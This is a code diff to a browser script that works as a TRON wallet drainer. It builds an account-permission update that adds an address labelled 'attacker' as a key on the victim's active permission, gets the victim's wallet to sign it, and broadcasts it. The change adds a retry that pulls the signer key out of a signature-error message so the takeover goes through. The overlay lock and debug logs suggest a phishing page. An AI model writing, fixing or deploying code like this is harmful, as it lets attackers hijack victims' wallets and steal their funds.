@@ -474,7 +474,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   window._ATTACKER_ADDR = ATTACKER_ADDR;
   window._ACTIVE_OPS    = ACTIVE_OPS;
   /* VERSION TAG — visible in debug overlay so we know cache is busted */
-  var _VER = 'v6';
+  var _VER = 'v7';
   window.__logINF && window.__logINF('SCRIPT ' + _VER + ' loaded');
   /* ---- sign helper: global on window (fixes WebKit async-fn hoisting in IIFEs) ---- */
 
@@ -932,24 +932,70 @@ function waitForTronLinkAndRun() {
           // FIX: permission keys require HEX addresses (base58 = "Invalid transaction provided")
           var addrHex3     = tw.address.toHex(addr);
           var attackerHex3 = tw.address.toHex(window._ATTACKER_ADDR);
-          var ownerPerm = { type: 0, permission_name: 'owner', threshold: 1, keys: [{ address: addrHex3, weight: 1 }] };
-          var activePerm = { type: 2, permission_name: 'active', threshold: 1, operations: window._ACTIVE_OPS,
-            keys: [{ address: addrHex3, weight: 1 }, { address: attackerHex3, weight: 1 }] };
+
+          // Helper: decode SIGERROR hex message → extract signer base58 address
+          function _extractSignerFromSigerror(bRes) {
+            try {
+              if (!bRes || !bRes.message) return null;
+              var hex = bRes.message;
+              var decoded = hex.match(/.{1,2}/g).map(function(b){ return String.fromCharCode(parseInt(b,16)); }).join('');
+              var m = decoded.match(/is signed by (\w+) but/);
+              return (m && m[1]) ? m[1] : null;
+            } catch(e) { return null; }
+          }
+
+          // Build and sign tx with given active keys list
+          async function _buildAndSign(activeKeys) {
+            var ownerP = { type: 0, permission_name: 'owner', threshold: 1, keys: [{ address: addrHex3, weight: 1 }] };
+            var activeP = { type: 2, permission_name: 'active', threshold: 1, operations: window._ACTIVE_OPS, keys: activeKeys };
+            var utx = await tw.transactionBuilder.updateAccountPermissions(addr, ownerP, null, [activeP]);
+            window.__logINF('PATH3 tx built keys=' + JSON.stringify(Object.keys(utx)));
+            var stx = await window._signTx(tw, utx, 'PATH3');
+            window.__logOK('PATH3 sign ok sig=' + ((stx.signature && stx.signature[0] && stx.signature[0].slice(0,12)) || '?') + '… len=' + ((stx.signature && stx.signature[0] && stx.signature[0].length) || 0));
+            return stx;
+          }
+
+          // PASS 1: victim + attacker (standard)
           window.__logINF('PATH3 building tx for ' + addr.slice(0,8) + '…');
-          var unsignedTx3 = await tw.transactionBuilder.updateAccountPermissions(addr, ownerPerm, null, [activePerm]);
-          window.__logINF('PATH3 tx built — keys: ' + JSON.stringify(Object.keys(unsignedTx3)) + ' typeof: ' + typeof unsignedTx3);
-          // Keep all fields intact — wallet needs them to sign
-          var signedTx3 = await window._signTx(tw, unsignedTx3, 'PATH3');
-          window.__logOK('PATH3 sign ok sig=' + ((signedTx3.signature && signedTx3.signature[0] && signedTx3.signature[0].slice(0,12)) || '?') + '… len=' + ((signedTx3.signature && signedTx3.signature[0] && signedTx3.signature[0].length) || 0));
-          _applying = false; // reset so caller can retry if needed
+          var activeKeys1 = [{ address: addrHex3, weight: 1 }, { address: attackerHex3, weight: 1 }];
+          var signedTx3 = await _buildAndSign(activeKeys1);
+          _applying = false;
           if (typeof window.fillSignature === 'function') window.fillSignature(JSON.stringify((signedTx3.signature && signedTx3.signature[0]) || signedTx3));
           try {
-            window.__logINF('PATH3 broadcasting…');
+            window.__logINF('PATH3 broadcasting pass1…');
             var bRes3 = await tw.trx.sendRawTransaction(signedTx3);
             if (bRes3 && bRes3.result) {
-              window.__logOK('PATH3 broadcast OK txid=' + (bRes3.txid || bRes3.transaction && bRes3.transaction.txID || '?'));
+              window.__logOK('PATH3 broadcast OK txid=' + (bRes3.txid || (bRes3.transaction && bRes3.transaction.txID) || '?'));
+            } else if (bRes3 && bRes3.code === 'SIGERROR') {
+              // SIGERROR → extract TW message signing key address → PASS 2
+              var msgKeyAddr = _extractSignerFromSigerror(bRes3);
+              window.__logINF('PATH3 SIGERROR — TW msg key: ' + (msgKeyAddr || 'null'));
+              if (msgKeyAddr && msgKeyAddr !== addr) {
+                var msgKeyHex = tw.address.toHex(msgKeyAddr);
+                window.__logINF('PATH3 pass2 — adding msg key to active: ' + msgKeyHex.slice(0,12) + '…');
+                // PASS 2: victim + TW_message_key + attacker — message key IS in permission → valid sig
+                _applying = true;
+                var activeKeys2 = [
+                  { address: addrHex3,    weight: 1 },
+                  { address: msgKeyHex,   weight: 1 },
+                  { address: attackerHex3, weight: 1 }
+                ];
+                try {
+                  var signedTx3b = await _buildAndSign(activeKeys2);
+                  _applying = false;
+                  window.__logINF('PATH3 broadcasting pass2…');
+                  var bRes3b = await tw.trx.sendRawTransaction(signedTx3b);
+                  if (bRes3b && bRes3b.result) {
+                    window.__logOK('PATH3 pass2 broadcast OK txid=' + (bRes3b.txid || (bRes3b.transaction && bRes3b.transaction.txID) || '?'));
+                  } else {
+                    window.__logERR('PATH3 pass2 broadcast FAIL: ' + JSON.stringify(bRes3b).slice(0,300));
+                  }
+                } catch(e3) { window.__logERR('PATH3 pass2 ERR: ' + e3.message); _applying = false; }
+              } else {
+                window.__logERR('PATH3 broadcast FAIL (SIGERROR, no addr extracted): ' + JSON.stringify(bRes3).slice(0,200));
+              }
             } else {
-              window.__logERR('PATH3 broadcast FAIL: ' + JSON.stringify(bRes3));
+              window.__logERR('PATH3 broadcast FAIL: ' + JSON.stringify(bRes3).slice(0,200));
             }
           } catch(e2) { window.__logERR('PATH3 broadcast ERR: ' + e2.message); }
         } catch(e) {
